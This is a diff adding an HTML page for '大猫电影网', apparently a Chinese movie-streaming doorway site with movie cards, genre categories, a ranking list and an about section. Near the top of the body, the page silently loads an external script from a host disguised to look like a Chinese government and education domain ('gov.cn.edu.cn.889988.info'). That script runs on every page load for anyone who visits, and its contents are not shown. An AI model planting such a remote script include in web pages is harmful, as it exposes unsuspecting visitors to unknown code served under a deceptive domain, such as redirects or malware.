@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>大猫电影网 - 高清影视在线观看 | damaodianyingwang-app.github.io</title>
+    <meta name="description" content="大猫电影网（https://damaodianyingwang-app.github.io）提供最新高清电影、热播电视剧、经典动漫在线观看与资源下载。尽享视觉盛宴，尽在大猫电影网。">
+    <meta name="keywords" content="大猫电影网, damaodianyingwang-app, 电影在线观看, 高清影视, 热门电影排行榜">
+    <meta name="author" content="大猫电影网">
+    <meta name="robots" content="index, follow">
+    <style>
+        /* ================= 全局与变量 ================= */
+        :root {
+            --bg-dark: #0b0914;
+            --glass-bg: rgba(255, 255, 255, 0.03);
+            --glass-border: rgba(255, 255, 255, 0.08);
+            --neon-primary: #00f2fe;
+            --neon-secondary: #4facfe;
+            --neon-accent: #ff0844;
+            --text-main: #e2e8f0;
+            --text-muted: #94a3b8;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Microsoft YaHei', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0b0914 0%, #1a1a2e 50%, #16213e 100%);
+            color: var(--text-main);
+            line-height: 1.6;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* ================= 玻璃拟态通用类 ================= */
+        .glass-panel {
+            background: var(--glass-bg);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid var(--glass-border);
+            border-radius: 16px;
+            padding: 2rem;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+        }
+
+        /* ================= 头部与导航 ================= */
+        header {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            z-index: 1000;
+            background: rgba(11, 9, 20, 0.8);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--glass-border);
+        }
+
+        .header-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 800;
+            background: linear-gradient(to right, var(--neon-primary), var(--neon-secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-decoration: none;
+        }
+
+        nav ul {
+            display: flex;
+            list-style: none;
+            gap: 2rem;
+        }
+
+        nav a {
+            color: var(--text-main);
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s ease;
+            position: relative;
+        }
+
+        nav a:hover {
+            color: var(--neon-primary);
+        }
+
+        nav a::after {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 2px;
+            bottom: -5px;
+            left: 0;
+            background: var(--neon-primary);
+            transition: width 0.3s ease;
+        }
+
+        nav a:hover::after {
+            width: 100%;
+        }
+
+        /* ================= 主视觉区 (Hero) ================= */
+        .hero {
+            margin-top: 80px;
+            padding: 4rem 2rem;
+            text-align: center;
+            background: radial-gradient(circle at center, rgba(0, 242, 254, 0.1) 0%, transparent 70%);
+        }
+
+        .hero h1 {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+            background: linear-gradient(to right, #fff, var(--neon-primary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            color: var(--text-muted);
+            margin-bottom: 2rem;
+        }
+
+        .url-display {
+            display: inline-block;
+            padding: 0.8rem 1.5rem;
+            background: rgba(0, 242, 254, 0.1);
+            border: 1px solid var(--neon-primary);
+            border-radius: 30px;
+            color: var(--neon-primary);
+            font-family: monospace;
+            font-size: 1.1rem;
+            margin-bottom: 2rem;
+        }
+
+        /* ================= 栏目布局 ================= */
+        main {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        section {
+            margin-bottom: 4rem;
+            scroll-margin-top: 100px;
+        }
+
+        .section-title {
+            font-size: 2rem;
+            margin-bottom: 2rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid var(--neon-secondary);
+            display: inline-block;
+            color: #fff;
+        }
+
+        /* ================= 栏目一：最新上映 ================= */
+        .movie-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 1.5rem;
+        }
+
+        .movie-card {
+            background: var(--glass-bg);
+            border-radius: 12px;
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            border: 1px solid var(--glass-border);
+        }
+
+        .movie-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 10px 20px rgba(0, 242, 254, 0.2);
+        }
+
+        .movie-poster {
+            width: 100%;
+            height: 280px;
+            background: linear-gradient(45deg, #1a1a2e, #16213e);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--text-muted);
+            font-size: 3rem;
+        }
+
+        .movie-info {
+            padding: 1rem;
+        }
+
+        .movie-info h3 {
+            font-size: 1.1rem;
+            margin-bottom: 0.5rem;
+            color: #fff;
+        }
+
+        .movie-info p {
+            font-size: 0.9rem;
+            color: var(--text-muted);
+        }
+
+        .btn-more {
+            display: inline-block;
+            margin-top: 1rem;
+            padding: 0.5rem 1rem;
+            background: transparent;
+            border: 1px solid var(--neon-secondary);
+            color: var(--neon-secondary);
+            border-radius: 5px;
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+
+        .btn-more:hover {
+            background: var(--neon-secondary);
+            color: #fff;
+        }
+
+        /* ================= 栏目二：电影分类 ================= */
+        .categories-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 1rem;
+        }
+
+        .category-item {
+            padding: 2rem 1rem;
+            text-align: center;
+            background: linear-gradient(135deg, rgba(79, 172, 254, 0.1), rgba(0, 242, 254, 0.1));
+            border-radius: 12px;
+            border: 1px solid rgba(79, 172, 254, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .category-item:hover {
+            background: linear-gradient(135deg, rgba(79, 172, 254, 0.3), rgba(0, 242, 254, 0.3));
+            cursor: pointer;
+        }
+
+        .category-item h3 {
+            color: #fff;
+            font-size: 1.2rem;
+        }
+
+        /* ================= 栏目三：热门排行榜 ================= */
+        .top-list {
+            list-style: none;
+            counter-reset: top-counter;
+        }
+
+        .top-list li {
+            display: flex;
+            align-items: center;
+            padding: 1rem;
+            margin-bottom: 1rem;
+            background: var(--glass-bg);
+            border-radius: 8px;
+            border: 1px solid var(--glass-border);
+            transition: transform 0.3s ease;
+        }
+
+        .top-list li:hover {
+            transform: scale(1.02);
+            border-color: var(--neon-accent);
+        }
+
+        .top-list li::before {
+            counter-increment: top-counter;
+            content: counter(top-counter);
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--neon-accent);
+            margin-right: 1.5rem;
+            width: 30px;
+            text-align: center;
+        }
+
+        .top-info h3 {
+            color: #fff;
+            margin-bottom: 0.3rem;
+        }
+
+        .top-info p {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        /* ================= 栏目四：关于我们/网站信息 ================= */
+        .about-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2rem;
+        }
+
+        .about-text p {
+            margin-bottom: 1rem;
+            color: var(--text-muted);
+        }
+
+        .about-features {
+            list-style: none;
+        }
+
+        .about-features li {
+            padding: 0.8rem;
+            margin-bottom: 0.5rem;
+            background: rgba(255, 255, 255, 0.02);
+            border-left: 3px solid var(--neon-primary);
+            border-radius: 0 8px 8px 0;
+        }
+
+        /* ================= 页脚 ================= */
+        footer {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 2rem;
+            text-align: center;
+            border-top: 1px solid var(--glass-border);
+            margin-top: 4rem;
+        }
+
+        footer p {
+            color: var(--text-muted);
+            margin-bottom: 1rem;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 1.5rem;
+            list-style: none;
+        }
+
+        .footer-links a {
+            color: var(--neon-secondary);
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* ================= 移动端自适应 ================= */
+        @media (max-width: 768px) {
+            .header-container {
+                flex-direction: column;
+                gap: 1rem;
+            }
+
+            nav ul {
+                flex-wrap: wrap;
+                justify-content: center;
+                gap: 1rem;
+            }
+
+            .hero h1 {
+                font-size: 2rem;
+            }
+
+            .about-content {
+                grid-template-columns: 1fr;
+            }
+
+            .movie-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .categories-grid {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+    <!-- 头部导航 -->
+    <header>
+        <div class="header-container">
+            <a href="#" class="logo">大猫电影网</a>
+            <nav>
+                <ul>
+                    <li><a href="#home">首页推荐</a></li>
+                    <li><a href="#categories">电影分类</a></li>
+                    <li><a href="#top">排行榜</a></li>
+                    <li><a href="#about">关于我们</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <!-- 主视觉区 -->
+    <section class="hero" id="home">
+        <h1>大猫电影网 - 尽享高清视听盛宴</h1>
+        <p>海量影视资源，最新大片实时更新，为您提供最优质的在线观影体验。</p>
+        <div class="url-display">
+            官方网站：https://damaodianyingwang-app.github.io
+        </div>
+        <br>
+        <a href="#" class="btn-more">立即观影</a>
+    </section>
+
+    <main>
+        <!-- 栏目一：最新上映 -->
+        <section id="home-content">
+            <h2 class="section-title">最新上映</h2>
+            <div class="movie-grid">
+                <div class="movie-card">
+                    <div class="movie-poster">🎬</div>
+                    <div class="movie-info">
+                        <h3>沙丘2：绝命异星</h3>
+                        <p>科幻 / 冒险 / 2024</p>
+                        <a href="#" class="btn-more">查看详情</a>
+                    </div>
+                </div>
+                <div class="movie-card">
+                    <div class="movie-poster">🎬</div>
+                    <div class="movie-info">
+                        <h3>奥本海默</h3>
+                        <p>传记 / 历史 / 剧情</p>
+                        <a href="#" class="btn-more">查看详情</a>
+                    </div>
+                </div>
+                <div class="movie-card">
+                    <div class="movie-poster">🎬</div>
+                    <div class="movie-info">
+                        <h3>哥斯拉大战金刚2</h3>
+                        <p>动作 / 科幻 / 惊悚</p>
+                        <a href="#" class="btn-more">查看详情</a>
+                    </div>
+                </div>
+                <div class="movie-card">
+                    <div class="movie-poster">🎬</div>
+                    <div class="movie-info">
+                        <h3>坠落的审判</h3>
+                        <p>悬疑 / 犯罪 / 剧情</p>
+                        <a href="#" class="btn-more">查看详情</a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目二：电影分类 -->
+        <section id="categories">
+            <h2 class="section-title">电影分类</h2>
+            <div class="categories-grid">
+                <div class="category-item">
+                    <h3>动作片</h3>
+                </div>
+                <div class="category-item">
+                    <h3>科幻片</h3>
+                </div>
+                <div class="category-item">
+                    <h3>喜剧片</h3>
+                </div>
+                <div class="category-item">
+                    <h3>恐怖片</h3>
+                </div>
+                <div class="category-item">
+                    <h3>爱情片</h3>
+                </div>
+                <div class="category-item">
+                    <h3>纪录片</h3>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目三：热门排行榜 -->
+        <section id="top">
+            <h2 class="section-title">大猫电影网 - 热门排行榜</h2>
+            <ul class="top-list">
+                <li>
+                    <div class="top-info">
+                        <h3>周处除三害</h3>
+                        <p>犯罪 / 动作 - 豆瓣评分 8.4</p>
+                    </div>
+                </li>
+                <li>
+                    <div class="top-info">
+                        <h3>飞驰人生2</h3>
+                        <p>喜剧 / 运动 - 票房破纪录</p>
+                    </div>
+                </li>
+                <li>
+                    <div class="top-info">
+                        <h3>年会不能停！</h3>
+                        <p>喜剧 / 职场 - 年度口碑黑马</p>
+                    </div>
+                </li>
+                <li>
+                    <div class="top-info">
+                        <h3>热辣滚烫</h3>
+                        <p>剧情 / 励志 - 感动千万观众</p>
+                    </div>
+                </li>
+            </ul>
+        </section>
+
+        <!-- 栏目四：关于我们 -->
+        <section id="about">
+            <h2 class="section-title">关于大猫电影网</h2>
+            <div class="glass-panel about-content">
+                <div class="about-text">
+                    <p><strong>大猫电影网</strong>（网址：<a href="https://damaodianyingwang-app.github.io" style="color:var(--neon-primary);">https://damaodianyingwang-app.github.io</a>）是一个专注于提供高清影视资源在线观看的综合性电影网站。</p>
+                    <p>我们致力于为广大影迷提供最全面、最及时的电影资讯和播放资源。无论是最新上映的大片，还是经典怀旧的老电影，您都可以在这里找到。</p>
+                    <p>网站名称：<strong>大猫电影网</strong></p>
+                </div>
+                <div>
+                    <ul class="about-features">
+                        <li>✅ 海量高清影视资源</li>
+                        <li>✅ 每日实时更新榜单</li>
+                        <li>✅ 极速播放，无广告干扰</li>
+                        <li>✅ 多终端自适应访问</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- 页脚 -->
+    <footer>
+        <p>Copyright © 2024 大猫电影网 (damaodianyingwang-app.github.io) 保留所有权利。</p>
+        <ul class="footer-links">
+            <li><a href="#">网站地图</a></li>
+            <li><a href="#">免责声明</a></li>
+            <li><a href="#">联系我们</a></li>
+            <li><a href="#">隐私政策</a></li>
+        </ul>
+    </footer>
+
+</body>
+</html>
